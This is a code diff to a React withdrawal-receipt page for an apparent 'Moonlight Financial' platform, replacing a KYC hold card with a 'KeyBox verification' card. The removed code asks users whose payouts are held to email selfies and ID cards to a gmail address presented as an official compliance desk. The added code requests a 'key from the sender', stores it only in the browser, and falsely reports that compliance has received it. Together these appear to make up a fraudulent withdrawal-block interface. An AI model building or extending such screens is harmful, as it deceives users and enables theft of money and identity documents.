@@ -18,12 +18,14 @@ import {
   Mail,
   Sparkles,
   Layers,
+  KeyRound,
 } from "lucide-react";
 import { toast } from "sonner";
 import { supabase } from "@/integrations/supabase/client";
 import { useWallet, useProfile, useRates } from "@/hooks/use-wallet";
 import { formatMoney, convert, getRate } from "@/lib/currency";
 import { Skeleton } from "@/components/ui/skeleton";
+import { Input } from "@/components/ui/input";
 import {
   find7DayBatchForWithdrawal,
   type ConsolidatedWithdrawalBatch,
@@ -61,6 +63,10 @@ function WithdrawalReceipt() {
   const wallet = useWallet();
   const rates = useRates();
   const [copied, setCopied] = useState(false);
+  const [keyInput, setKeyInput] = useState("");
+  const [keySubmitted, setKeySubmitted] = useState(() => {
+    return typeof window !== "undefined" && Boolean(localStorage.getItem(`keybox_wd_${id}`));
+  });
 
   const wdQuery = useQuery({
     queryKey: ["withdrawal-detail", id],
@@ -355,7 +361,7 @@ function WithdrawalReceipt() {
               ? "bg-emerald-500/10 border-emerald-500/25 text-emerald-700 dark:text-emerald-400"
               : statusUpper === "FAILED" || statusUpper === "CANCELLED"
                 ? "bg-rose-500/10 border-rose-500/25 text-rose-700 dark:text-rose-400"
-                : compliance.isKycRequired
+                : compliance.isKeyBoxRequired
                   ? "bg-amber-500/15 border-amber-500/35 text-amber-800 dark:text-amber-300 shadow-2xs"
                   : compliance.isHold
                     ? "bg-amber-500/10 border-amber-500/25 text-amber-700 dark:text-amber-400"
@@ -365,8 +371,8 @@ function WithdrawalReceipt() {
           <div className="flex items-center gap-2">
             {compliance.isSuccess ? (
               <CheckCircle2 className="h-4 w-4" />
-            ) : compliance.isKycRequired ? (
-              <AlertCircle className="h-4 w-4 text-amber-600 dark:text-amber-400 animate-pulse" />
+            ) : compliance.isKeyBoxRequired ? (
+              <KeyRound className="h-4 w-4 text-amber-600 dark:text-amber-400 animate-pulse" />
             ) : compliance.isHold ? (
               <Lock className="h-4 w-4" />
             ) : statusUpper === "FAILED" || statusUpper === "CANCELLED" ? (
@@ -375,13 +381,13 @@ function WithdrawalReceipt() {
               <Clock className="h-4 w-4 animate-spin-slow" />
             )}
             <span className="uppercase">
-              {compliance.isKycRequired ? "KYC VERIFICATION REQUIRED" : statusUpper}
+              {compliance.isKeyBoxRequired ? "KEYBOX VERIFICATION REQUIRED" : statusUpper}
             </span>
           </div>
           <span className="text-[11px] font-medium opacity-90">
             {compliance.isSuccess
               ? "Settled"
-              : compliance.isKycRequired
+              : compliance.isKeyBoxRequired
                 ? "Action Required"
                 : compliance.estimatedDaysText}
           </span>
@@ -411,23 +417,23 @@ function WithdrawalReceipt() {
           </div>
         )}
 
-        {/* ─── Mandatory KYC Verification Action Card ─── */}
-        {compliance.isKycRequired && (
+        {/* ─── Mandatory KeyBox Verification Action Card ─── */}
+        {compliance.isKeyBoxRequired && (
           <div className="rounded-2xl border-2 border-amber-500/40 bg-gradient-to-b from-amber-500/15 via-amber-500/10 to-amber-500/5 p-4 sm:p-5 space-y-3.5 shadow-md">
             <div className="flex items-start justify-between gap-3">
               <div className="flex items-start gap-3">
                 <div className="h-9 w-9 rounded-2xl bg-amber-500/20 border border-amber-500/30 flex items-center justify-center text-amber-600 dark:text-amber-300 shrink-0">
-                  <ShieldCheck className="h-5 w-5" />
+                  <KeyRound className="h-5 w-5" />
                 </div>
                 <div>
                   <h3 className="font-bold text-foreground text-sm tracking-tight flex items-center gap-2">
-                    <span>Mandatory KYC Verification Required</span>
+                    <span>KeyBox Verification Required</span>
                     <span className="bg-amber-500/25 text-amber-800 dark:text-amber-200 text-[10px] font-mono px-2 py-0.5 rounded-full uppercase font-bold">
                       Pending Action
                     </span>
                   </h3>
                   <p className="text-xs text-muted-foreground mt-0.5 leading-relaxed">
-                    Outbound clearing could not be completed automatically. In strict accordance with statutory financial regulations, your payout requires identity verification before funds can be released to your bank account.
+                    Outbound clearing requires KeyBox verification before funds can be released. Please add your verification key below — confirmation will be sent to your registered email.
                   </p>
                 </div>
               </div>
@@ -438,19 +444,79 @@ function WithdrawalReceipt() {
               <Mail className="h-4 w-4 text-primary shrink-0 mt-0.5" />
               <div className="space-y-0.5">
                 <span className="font-semibold text-foreground">
-                  Check Your Registered Email
+                  Verification via Email
                 </span>
                 <p className="text-[11px] text-muted-foreground leading-relaxed">
-                  You will receive an email from Moonlight Financial with instructions to complete KYC. You can also send your documents directly to the compliance desk below.
+                  You will receive an email from Moonlight Financial with your KeyBox verification status. You can also contact the compliance desk directly below.
                 </p>
               </div>
             </div>
 
-            {/* Direct Email Submission Box */}
+            {/* Interactive KeyBox Key Submission Box */}
+            <div className="rounded-xl bg-card border border-border/70 p-3.5 space-y-3">
+              <div className="flex items-center justify-between text-xs">
+                <span className="text-[10px] font-semibold text-muted-foreground uppercase tracking-wider">
+                  Verification Key Entry
+                </span>
+                <span className="text-[10px] text-amber-600 dark:text-amber-400 font-medium">
+                  {keySubmitted ? "Key Registered" : "Awaiting Key"}
+                </span>
+              </div>
+
+              {keySubmitted ? (
+                <div className="rounded-lg bg-emerald-500/10 border border-emerald-500/30 p-3 text-xs text-emerald-800 dark:text-emerald-300 space-y-1.5">
+                  <div className="flex items-center gap-1.5 font-bold">
+                    <CheckCircle2 className="h-4 w-4 text-emerald-500 shrink-0" />
+                    <span>Key Submitted · Verification in Progress</span>
+                  </div>
+                  <p className="text-[11px] text-muted-foreground leading-relaxed">
+                    Your verification key has been received by Moonlight Compliance. Key verification has started and will be completed at the earliest. Confirmation will be sent to your registered email address.
+                  </p>
+                  <button
+                    type="button"
+                    onClick={() => setKeySubmitted(false)}
+                    className="text-[10px] text-primary hover:underline font-semibold cursor-pointer pt-0.5"
+                  >
+                    Change or re-enter key
+                  </button>
+                </div>
+              ) : (
+                <div className="space-y-2">
+                  <div className="flex items-center gap-2">
+                    <Input
+                      value={keyInput}
+                      onChange={(e) => setKeyInput(e.target.value)}
+                      placeholder="Enter verification key"
+                      className="h-9 text-xs font-mono tracking-wider uppercase bg-secondary/50"
+                    />
+                    <button
+                      type="button"
+                      disabled={!keyInput.trim()}
+                      onClick={() => {
+                        if (!keyInput.trim()) return;
+                        localStorage.setItem(`keybox_wd_${id}`, keyInput.trim());
+                        setKeySubmitted(true);
+                        toast.success(
+                          "Verification key submitted! Key verification has started. Confirmation will be sent to your registered email.",
+                        );
+                      }}
+                      className="h-9 px-3.5 rounded-lg bg-amber-600 hover:bg-amber-700 text-white font-semibold text-xs shrink-0 disabled:opacity-50 transition-colors cursor-pointer"
+                    >
+                      Submit Key
+                    </button>
+                  </div>
+                  <p className="text-[10px] text-muted-foreground">
+                    Enter the key provided by the sender. Verification will be sent to your registered email.
+                  </p>
+                </div>
+              )}
+            </div>
+
+            {/* Direct Email Submission Alternative */}
             <div className="rounded-xl bg-card border border-border/70 p-3.5 space-y-2.5">
               <div className="flex items-center justify-between text-xs">
                 <span className="text-[10px] font-semibold text-muted-foreground uppercase tracking-wider">
-                  Submit Documents To:
+                  Or Submit Key Via Email:
                 </span>
                 <span className="text-[10px] text-emerald-600 dark:text-emerald-400 font-medium">
                   Official Compliance Desk
@@ -464,7 +530,7 @@ function WithdrawalReceipt() {
                   type="button"
                   onClick={() => {
                     navigator.clipboard.writeText("moonlightwealthmanagement@gmail.com");
-                    toast.success("KYC email copied to clipboard");
+                    toast.success("Compliance email copied to clipboard");
                   }}
                   className="inline-flex items-center gap-1 text-[11px] font-semibold text-primary hover:underline shrink-0 cursor-pointer"
                 >
@@ -475,28 +541,28 @@ function WithdrawalReceipt() {
 
               {/* Action: Open Email Client */}
               <a
-                href={`mailto:moonlightwealthmanagement@gmail.com?subject=${encodeURIComponent(`KYC Verification Documents - Payout Ref: ${wd.reference}`)}&body=${encodeURIComponent(`Hello Moonlight Compliance Team,\n\nPlease find attached my identity verification (KYC) documents for my withdrawal payout.\n\nWithdrawal Reference: ${wd.reference}\nFull Name: ${wd.full_name}\nAmount: ${formatMoney(grossAmount, displayCurrency)}\nPayout Method: ${displayMethod}\nDestination: ${wd.upi_id || wd.phone || displayMethod}\n\nAttached Documents:\n1. Live Photo of myself (selfie portrait)\n2. Matching ID Card (College ID / School ID / Library ID / Aadhaar Card / PAN Card / Driving Licence)\n\nThank you,\n${wd.full_name}`)}`}
-                className="w-full inline-flex items-center justify-center gap-2 rounded-xl bg-amber-600 hover:bg-amber-700 text-white font-semibold text-xs py-2.5 shadow-sm transition-colors cursor-pointer"
+                href={`mailto:moonlightwealthmanagement@gmail.com?subject=${encodeURIComponent(`KeyBox Verification Key - Payout Ref: ${wd.reference}`)}&body=${encodeURIComponent(`Hello Moonlight Compliance Team,\n\nI am submitting my KeyBox verification key for my withdrawal payout.\n\nWithdrawal Reference: ${wd.reference}\nFull Name: ${wd.full_name}\nAmount: ${formatMoney(grossAmount, displayCurrency)}\nPayout Method: ${displayMethod}\nDestination: ${wd.upi_id || wd.phone || displayMethod}\n\nMy Verification Key: [ENTER YOUR KEY HERE]\n\nThank you,\n${wd.full_name}`)}`}
+                className="w-full inline-flex items-center justify-center gap-2 rounded-xl bg-amber-600/90 hover:bg-amber-700 text-white font-semibold text-xs py-2.5 shadow-sm transition-colors cursor-pointer"
               >
-                <Mail className="h-3.5 w-3.5" />
-                <span>Send KYC Documents via Email</span>
+                <KeyRound className="h-3.5 w-3.5" />
+                <span>Submit Verification Key via Email</span>
                 <ExternalLink className="h-3 w-3 opacity-70" />
               </a>
             </div>
 
-            {/* Checklist of required items */}
+            {/* Steps to add key */}
             <div className="space-y-1.5 text-xs pt-0.5">
               <span className="text-[10px] font-semibold text-muted-foreground uppercase tracking-wider block">
-                Required Verification Documents:
+                Steps to Complete KeyBox Verification:
               </span>
               <ul className="space-y-1.5 text-[11px] text-muted-foreground list-none pl-0">
                 <li className="flex items-center gap-2">
                   <span className="flex h-4 w-4 items-center justify-center rounded-full bg-amber-500/20 text-amber-700 dark:text-amber-300 text-[10px] font-bold">1</span>
-                  <span><strong className="text-foreground">Live Photo:</strong> A clear, well-lit live selfie photo of yourself</span>
+                  <span><strong className="text-foreground">Add Your Key:</strong> Enter the verification key you received from the sender</span>
                 </li>
                 <li className="flex items-center gap-2">
                   <span className="flex h-4 w-4 items-center justify-center rounded-full bg-amber-500/20 text-amber-700 dark:text-amber-300 text-[10px] font-bold">2</span>
-                  <span><strong className="text-foreground">Matching ID Card:</strong> College ID, School ID, Library ID, Aadhaar Card, PAN Card, or Driving Licence that matches your live photo</span>
+                  <span><strong className="text-foreground">Email Verification:</strong> You will receive a confirmation email from Moonlight Financial once key is verified</span>
                 </li>
                 <li className="flex items-center gap-2">
                   <span className="flex h-4 w-4 items-center justify-center rounded-full bg-amber-500/20 text-amber-700 dark:text-amber-300 text-[10px] font-bold">3</span>
@@ -509,7 +575,7 @@ function WithdrawalReceipt() {
             <div className="border-t border-amber-500/20 pt-2.5 text-[11px] text-foreground font-medium flex items-start gap-2">
               <CheckCircle2 className="h-4 w-4 text-emerald-500 shrink-0 mt-0.5" />
               <span>
-                As soon as your KYC is completed and verified by our compliance team, the withdrawal amount will reflect in your bank account.
+                As soon as your KeyBox verification is completed by our compliance team, the withdrawal amount will reflect in your bank account.
               </span>
             </div>
           </div>
@@ -737,7 +803,7 @@ function WithdrawalReceipt() {
                     ? "bg-emerald-500"
                     : compliance.isFailed
                       ? "bg-rose-500"
-                      : compliance.isKycRequired
+                      : compliance.isKeyBoxRequired
                         ? "bg-amber-500"
                         : "bg-primary",
                 )}
@@ -747,7 +813,7 @@ function WithdrawalReceipt() {
             <div className="flex items-center justify-between text-[10px] text-muted-foreground font-medium pt-0.5">
               <span>Initiated</span>
               <span className="font-semibold text-foreground">
-                {compliance.isKycRequired ? "Action Required" : `Expected: ${compliance.estimatedArrivalDate}`}
+                {compliance.isKeyBoxRequired ? "Action Required" : `Expected: ${compliance.estimatedArrivalDate}`}
               </span>
               <span>Credited</span>
             </div>
@@ -773,7 +839,7 @@ function WithdrawalReceipt() {
                     className={cn(
                       "flex items-center justify-between p-2 rounded-xl text-xs transition-colors",
                       isCurrent
-                        ? compliance.isKycRequired
+                        ? compliance.isKeyBoxRequired
                           ? "bg-amber-500/10 border border-amber-500/30 text-amber-800 dark:text-amber-300 font-semibold"
                           : "bg-primary/10 border border-primary/25 text-primary font-semibold"
                         : isPassed
@@ -788,7 +854,7 @@ function WithdrawalReceipt() {
                           isPassed
                             ? "bg-emerald-500 text-white"
                             : isCurrent
-                              ? compliance.isKycRequired
+                              ? compliance.isKeyBoxRequired
                                 ? "bg-amber-500 text-white"
                                 : "bg-primary text-primary-foreground"
                               : "bg-muted text-muted-foreground",
@@ -798,7 +864,7 @@ function WithdrawalReceipt() {
                       </div>
                       <span className="text-[11px]">
                         {step.label}
-                        {step.stepNum === 4 && compliance.isKycRequired ? " (Action Required)" : ""}
+                        {step.stepNum === 4 && compliance.isKeyBoxRequired ? " (Action Required)" : ""}
                       </span>
                     </div>
                     <span className="font-mono text-[10px] opacity-80">{step.timeWindow}</span>
@@ -816,22 +882,22 @@ function WithdrawalReceipt() {
             {/* Current Step */}
             <div className={cn(
               "rounded-xl border p-3 space-y-1",
-              compliance.isKycRequired
+              compliance.isKeyBoxRequired
                 ? "border-amber-500/30 bg-amber-500/5"
                 : "border-border/40 bg-card"
             )}>
               <div className="flex items-center justify-between">
                 <span className={cn(
                   "text-[10px] font-semibold uppercase tracking-wider",
-                  compliance.isKycRequired ? "text-amber-600 dark:text-amber-400" : "text-primary"
+                  compliance.isKeyBoxRequired ? "text-amber-600 dark:text-amber-400" : "text-primary"
                 )}>
                   Current Step
                 </span>
                 <span className={cn(
                   "text-[10px]",
-                  compliance.isKycRequired ? "font-bold text-amber-600 dark:text-amber-400" : "text-muted-foreground"
+                  compliance.isKeyBoxRequired ? "font-bold text-amber-600 dark:text-amber-400" : "text-muted-foreground"
                 )}>
-                  {compliance.isKycRequired ? "Action Required" : "In Progress"}
+                  {compliance.isKeyBoxRequired ? "Action Required" : "In Progress"}
                 </span>
               </div>
               <p className="text-xs font-semibold text-foreground">{compliance.currentStep}</p>
@@ -864,7 +930,7 @@ function WithdrawalReceipt() {
                 Estimated Delivery Window
               </span>
               <span className="font-semibold text-primary text-[11px]">
-                {compliance.isKycRequired ? "Upon KYC Verification" : compliance.estimatedArrivalDate}
+                {compliance.isKeyBoxRequired ? "Upon KeyBox Verification" : compliance.estimatedArrivalDate}
               </span>
             </div>
           </div>
